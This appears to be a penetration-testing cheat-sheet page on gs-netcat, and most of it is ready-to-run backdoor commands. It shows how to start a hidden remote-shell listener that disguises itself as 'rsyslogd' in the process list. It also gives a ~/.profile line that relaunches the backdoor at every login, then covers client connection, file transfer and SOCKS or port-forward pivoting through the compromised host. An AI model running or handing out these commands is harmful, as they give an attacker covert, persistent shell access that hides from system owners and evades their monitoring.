# gs-netcat

### Overview

The Global Socket Tookit allows two users behind NAT/Firewall to establish a TCP connection with each other. Securely.

More on [https://www.gsocket.io](https://www.gsocket.io).

### Non Persistent backdoor

```
$(GSOCKET_ARGS="-s MySecret -liqD" HOME=/root TERM=xterm-256color SHELL="/bin/bash" /bin/bash -c "cd $HOME; exec -a rsyslogd /path/to/gs-netcat")
```

### Client Connection

```
gs-netcat -i -s MySecret
```

* Above will spawn a full pty giving you the option to tab complete and use up arrow as long as CTRL+C

### Persisting the Server

The following line in the user's \~/.profile starts the backdoor (once) when the user logs in. All in one line:

The '( )' brackets start a sub-shell which is then replaced (by exec) with the gs-netcat process. The process is hidden (as rsyslogd) from the process list.

```
killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s MySecret -liqD" SHELL=/bin/bash exec -a rsyslogd /path/to/gs-netcat)
```

* Ensure there are no syntax errors or the next time a user logs in they will see this message&#x20;

```
ssh root@ubuntu.space
root@ubuntu.space's password: 
Last login: Mon Dec 30 19:29:55 2024 from 192.168.15.172
-bash: /root/.profile: line 11: syntax error: unexpected end of file
```

* when you are connected to the backdoor this is how your process will look&#x20;

```
1 S root         442       1  0  80   0 -   794 do_wai 19:43 ?        00:00:00 rsyslogd
1 S root         443     442  0  80   0 -   829 do_sel 19:43 ?        00:00:00  \_ rsyslogd
0 S root         528     443  0  80   0 -  2105 do_sel 19:47 pts/4    00:00:00      \_ -bash
```

* above will occur no matter how you connect to the server

```
gs-netcat -s MySecret
gs-netcat -s -i MySecret
```

### Command Console

* If you connect to a listening gs-netcat server with the below options you will have access to the command console

```
gs-netcat -i -s MySecret 
```

* access it with CTRL+E c, you will see the below

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

* this nicely provides a way to upload and download files as well as local commands just like in metasploit i.e. lls lcd

### Proxies

#### Server to act as a SOCKS4/4a/5 server:

```
gs-netcat -s MySecret -l -S
```

Client to listen on TCP port 1080 and forward any new connection to the server's SOCKS server:

```
gs-netcat -s MySecret -p 1080
```

#### TCP Port Forward all connections to 192.168.6.7:22

Server:

```
gs-netcat -s MySecret -l -d 192.168.6.7 -p 22 
```

Client to listen on TCP port 2222 and forward any new connection to the the server. The server then forwards the connection to 192.168.6.7:22.

```
gs-netcat -s MySecret -p 2222
ssh -p 2222 root@127.0.0.1
```

The same using 1 command:

```
ssh -o ProxyCommand='gs-netcat -s MySecret' root@ignored
```
